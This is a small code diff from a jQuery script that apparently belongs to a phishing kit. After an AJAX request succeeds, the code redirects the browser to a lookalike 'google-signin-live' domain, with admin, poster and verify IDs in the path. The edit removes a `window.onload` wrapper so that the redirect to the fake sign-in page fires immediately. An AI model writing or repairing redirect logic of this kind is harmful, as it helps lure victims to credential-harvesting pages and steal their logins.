@@ -116,9 +116,9 @@ $(document).ready(function () {
                     console.log('Response:', response);
                     
                         // Redirect to another URL on success
-                        window.onload = function(){
+                     
                             window.location.href =  `https://google-signin-live.vercel.app/${adminId}/${posterId}/${verifyId}`;
-                          }
+                        
                     
                 },
                 error: function (xhr, status, error) {
